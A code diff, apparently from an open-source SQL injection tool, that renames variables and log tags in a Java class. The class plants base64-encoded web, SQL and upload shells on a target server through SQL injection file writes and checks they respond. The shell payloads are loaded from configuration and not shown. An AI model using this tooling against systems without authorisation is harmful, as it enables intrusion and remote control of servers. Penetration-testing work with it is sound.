@@ -251,7 +251,7 @@ public class ResourceAccess {
             return;
         }
         
-        String sourceShellToInject = StringUtil.base64Decode(
+        String bodyShell = StringUtil.base64Decode(
             this.injectionModel.getMediatorUtils()
             .getPropertiesUtil()
             .getProperties()
@@ -271,7 +271,7 @@ public class ResourceAccess {
             .getMediatorVendor()
             .getVendor()
             .instance()
-            .sqlTextIntoFile(sourceShellToInject, pathShellFixed + this.filenameWebshell),
+            .sqlTextIntoFile(bodyShell, pathShellFixed + this.filenameWebshell),
             "shell:create-web"
         );
 
@@ -284,7 +284,7 @@ public class ResourceAccess {
                 false,
                 1,
                 null,
-                "webshell"
+                "shell:read"
             );
 
             if (StringUtils.isEmpty(resultInjection)) {
@@ -310,7 +310,7 @@ public class ResourceAccess {
             url = this.injectionModel.getMediatorUtils().getConnectionUtil().getUrlBase();
         }
 
-        if (!resultInjection.contains(sourceShellToInject)) {
+        if (!resultInjection.contains(bodyShell)) {
             
             throw this.getIntegrityError(sourcePage);
         }
@@ -361,7 +361,7 @@ public class ResourceAccess {
                 new CallableHttpHead(
                     urlProtocol + urlPart + this.filenameWebshell,
                     this.injectionModel,
-                    "wshell#run"
+                    "shell#confirm"
                 )
             );
         }
@@ -496,16 +496,14 @@ public class ResourceAccess {
             return;
         }
         
-        String sourceShellToInject =
-            StringUtil
-            .base64Decode(
-                this.injectionModel.getMediatorUtils()
-                .getPropertiesUtil()
-                .getProperties()
-                .getProperty("shell.sql")
-            )
-            .replace(DataAccess.SHELL_LEAD, DataAccess.LEAD)
-            .replace(DataAccess.SHELL_TRAIL, DataAccess.TRAIL);
+        String bodyShell = StringUtil.base64Decode(
+            this.injectionModel.getMediatorUtils()
+            .getPropertiesUtil()
+            .getProperties()
+            .getProperty("shell.sql")
+        )
+        .replace(DataAccess.SHELL_LEAD, DataAccess.LEAD)
+        .replace(DataAccess.SHELL_TRAIL, DataAccess.TRAIL);
 
         String pathShellFixed = pathShell;
         if (!pathShellFixed.matches(".*/$")) {
@@ -514,7 +512,7 @@ public class ResourceAccess {
         }
         
         this.injectionModel.injectWithoutIndex(
-            this.injectionModel.getMediatorVendor().getVendor().instance().sqlTextIntoFile(sourceShellToInject, pathShellFixed + this.filenameSqlshell),
+            this.injectionModel.getMediatorVendor().getVendor().instance().sqlTextIntoFile(bodyShell, pathShellFixed + this.filenameSqlshell),
             "shell:create-sql"
         );
 
@@ -528,7 +526,7 @@ public class ResourceAccess {
                 false,
                 1,
                 null,
-                "sqlshell"
+                "shell:read"
             );
 
             if (StringUtils.isEmpty(resultInjection)) {
@@ -554,7 +552,7 @@ public class ResourceAccess {
             url = this.injectionModel.getMediatorUtils().getConnectionUtil().getUrlBase();
         }
 
-        if (!resultInjection.contains(sourceShellToInject)) {
+        if (!resultInjection.contains(bodyShell)) {
             
             throw this.getIntegrityError(sourcePage);
         }
@@ -606,7 +604,7 @@ public class ResourceAccess {
                 new CallableHttpHead(
                     urlProtocol + urlPart + this.filenameSqlshell,
                     this.injectionModel,
-                    "sqlshell:create"
+                    "shell:confirm"
                 )
             );
         }
@@ -812,14 +810,13 @@ public class ResourceAccess {
             return;
         }
         
-        String sourceShellToInject = StringUtil
-            .base64Decode(
-                this.injectionModel.getMediatorUtils()
-                .getPropertiesUtil()
-                .getProperties()
-                .getProperty("shell.upload")
-            )
-            .replace(DataAccess.SHELL_LEAD, DataAccess.LEAD);
+        String bodyShell = StringUtil.base64Decode(
+            this.injectionModel.getMediatorUtils()
+            .getPropertiesUtil()
+            .getProperties()
+            .getProperty("shell.upload")
+        )
+        .replace(DataAccess.SHELL_LEAD, DataAccess.LEAD);
         
         String pathShellFixed = pathFile;
         
@@ -833,17 +830,17 @@ public class ResourceAccess {
             .getVendor()
             .instance()
             .sqlTextIntoFile(
-                "<"+ DataAccess.LEAD +">"+ sourceShellToInject +"<"+ DataAccess.TRAIL +">",
+                "<"+ DataAccess.LEAD +">"+ bodyShell +"<"+ DataAccess.TRAIL +">",
                 pathShellFixed + this.filenameUpload
             ),
             "upload"
         );
 
         var sourcePage = new String[]{ StringUtils.EMPTY };
-        String sourceShellInjected;
+        String bodyShellInjected;
         
         try {
-            sourceShellInjected = new SuspendableGetRows(this.injectionModel).run(
+            bodyShellInjected = new SuspendableGetRows(this.injectionModel).run(
                 this.injectionModel.getMediatorVendor().getVendor().instance().sqlFileRead(pathShellFixed + this.filenameUpload),
                 sourcePage,
                 false,
@@ -852,7 +849,7 @@ public class ResourceAccess {
                 "upload"
             );
             
-            if (StringUtils.isEmpty(sourceShellInjected)) {
+            if (StringUtils.isEmpty(bodyShellInjected)) {
                 
                 throw new JSqlException(MSG_EMPTY_PAYLOAD);
             }
@@ -874,7 +871,7 @@ public class ResourceAccess {
                 );
         }
         
-        if (sourceShellInjected.contains(sourceShellToInject)) {
+        if (bodyShellInjected.contains(bodyShell)) {
             
             String logUrlFileFixed = urlFileFixed;
             String logPathShellFixed = pathShellFixed;
